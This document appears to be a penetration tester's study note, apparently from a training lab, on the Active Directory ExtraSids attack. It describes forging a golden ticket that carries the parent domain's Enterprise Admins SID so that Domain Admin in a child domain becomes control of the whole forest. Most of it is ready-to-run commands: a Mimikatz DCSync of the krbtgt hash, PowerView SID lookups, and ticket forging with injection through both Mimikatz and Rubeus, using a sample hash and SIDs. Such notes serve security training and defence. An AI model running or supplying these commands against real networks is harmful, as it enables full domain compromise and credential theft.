# ExtraSids Attack: Mimikatz and Rubeus

OS: Active_Directory, Windows
Description: Forge a Golden Ticket for Parent Domain given Domain Admin status within Child.
Security Domains: Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21), Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), mimikatz (https://www.notion.so/mimikatz-1464c8e5237680df8de9d1588f8d4980?pvs=21)

### **ExtraSids Attack - Mimikatz**

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

### Attack

- Get krbtgt hash
    - Mimikatz

```jsx
lsadump::dcsync /user:TargetDomain\krbtgt
```

- Powerview: Get SID of Child Domain

```jsx
Get-DomainSID
```

- Obtain ‘Enterprise Admins’ SID from parent domain
    - `S-1-5-21-3842939050-3880317879-2865463114-519`

```jsx
Get-DomainGroup -Domain TargetDomain.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

### This should fail in a default state

```jsx
ls \\academy-ea-dc01.inlanefreight.local\c$
```

### Mimikatz Forge Golden Ticket

```jsx
kerberos::golden /user:hacker /domain:Child.TargetDomain.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

- With the ticket in memory (klist), we can now

```jsx
ls \\academy-ea-dc01.inlanefreight.local\c$
```

### Rubeus Attack

- The user does not have to exist.

```jsx
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:Child.TargetDomain.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```